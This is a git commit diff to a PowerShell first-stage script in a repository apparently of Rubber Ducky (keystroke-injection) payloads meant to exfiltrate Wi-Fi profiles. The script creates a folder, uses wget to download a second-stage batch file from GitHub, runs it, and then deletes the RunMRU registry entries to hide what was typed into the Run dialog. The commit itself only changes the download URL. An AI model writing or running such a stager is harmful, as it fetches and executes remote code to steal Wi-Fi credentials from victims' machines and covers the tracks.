58ee02f2e951ba161e9614b800f3c32e4fb2aa05
Andrej <s3luX@users.noreply.github.com>
2022-12-22 00:23:35 +0100

    Update stage_1.ps1

--- wifi_profiles_exfil/stage_1.ps1
+++ wifi_profiles_exfil/stage_1.ps1
@@ -1,5 +1,5 @@
 cd /;mkdir x64;cd x64;
-wget https://raw.githubusercontent.com/s3luX/RDucky_payload/master/wifi_profile_exfil/stage_2.bat -OutFile stage2.bat
+wget https://github.com/s3luX/RDucky_payloads/blob/main/wifi_profiles_exfil/stage_2.bat -OutFile stage2.bat
 start stage2.bat
 Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
 exit
